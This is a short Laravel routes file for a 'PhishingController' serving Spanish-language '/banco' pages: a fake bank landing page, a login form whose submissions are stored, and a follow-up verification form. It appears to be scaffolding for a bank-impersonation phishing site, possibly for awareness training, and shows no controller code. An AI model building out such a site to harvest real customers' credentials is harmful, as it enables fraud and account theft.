<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PhishingController;

Route::get('/banco', [PhishingController::class, 'index'])->name('phishing.index');
Route::post('/banco/login', [PhishingController::class, 'storeLogin'])->name('phishing.login.store');
Route::get('/banco/verificacion', [PhishingController::class, 'showVerificationForm'])->name('phishing.verification');
Route::post('/banco/verificacion', [PhishingController::class, 'storeVerification'])->name('phishing.verification.store');